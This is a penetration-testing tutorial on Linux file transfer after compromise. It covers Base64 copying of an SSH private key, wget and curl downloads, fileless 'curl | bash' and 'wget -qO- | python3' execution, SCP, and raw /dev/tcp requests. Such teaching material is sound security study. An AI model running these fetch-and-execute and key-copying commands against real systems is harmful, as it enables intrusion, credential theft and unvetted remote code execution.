During a penetration test, downloading files from a remote machine is a common task. This may include retrieving configuration files, credentials, scripts, or binaries from a compromised system. 

---

## Base64 Encoding / Decoding

Depending on the environment and file size, files can be transferred **without using network communication**. This method is useful when network access is restricted but terminal access is available.

The file is encoded into a Base64 string on one machine, manually copied, and decoded on the target system.

### Attacker Machine 
**Check File MD5 Hash:**
Before transferring the file, calculate its MD5 hash to verify integrity after decoding.

```bash
md5sum id_rsa
```

**Encode File to Base64:**

The file content is printed and encoded into a single-line Base64 string. The `-w 0` option ensures the output is not wrapped.

```bash
cat id_rsa | base64 -w 0; echo
```

The output is copied manually.


### Linux Target
**Decode the File:**

The Base64 string is decoded back into its original binary format.

```bash
echo -n '<BASE64_STRING>' | base64 -d > id_rsa
```

**Verify File Integrity:**

After decoding, verify that the file was transferred correctly by comparing MD5 hashes.

```bash
md5sum id_rsa
```

If the hashes match, the transfer was successful.

> Note: This process can also be reversed to upload files from the target back to the attacker machine.

---

## Web Downloads with wget and cURL

`wget` and `curl` are standard Linux utilities used to interact with web servers. They are commonly available and reliable for downloading files over HTTP or HTTPS.


### Download a File Using wget

The `-O` option specifies the output filename.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```


### Download a File Using cURL

cURL uses a lowercase `-o` option to define the output file.

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## Fileless Attacks Using Linux

Linux pipelines allow commands to execute scripts **directly in memory** without saving them to disk. This reduces forensic artifacts and is commonly used in post-exploitation.

> Note: Some payloads may still create temporary files depending on their behavior.

### Fileless Download with cURL

The script is downloaded and executed immediately using a pipe.

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless Download with wget

Using `-qO-`, wget sends output to stdout, which is piped into Python.

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```



---

## SSH Downloads (SCP)

SSH provides a secure method for remote access and file transfer. The `scp` utility allows files to be copied securely between systems using SSH authentication.


### Enable and Start SSH Server 

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```


### Verify SSH Service is Listening

```bash
netstat -lnpt
```

The SSH service should be listening on port 22.


### Download Files Using SCP

Files can be copied from the remote machine to the local system using credentials.

```bash
scp user@192.168.49.128:/root/myroot.txt .
```

This command securely downloads the file to the current directory.

---

## Download with Bash (/dev/tcp)

If common download tools are unavailable, Bash can still perform basic network operations using `/dev/tcp`, provided it is enabled.


### Connect to the Web Server

This opens a TCP connection to the remote host.

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

### Send an HTTP GET Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

### Read the Response

```bash
cat <&3
```

This method is primitive but effective in restricted environments.
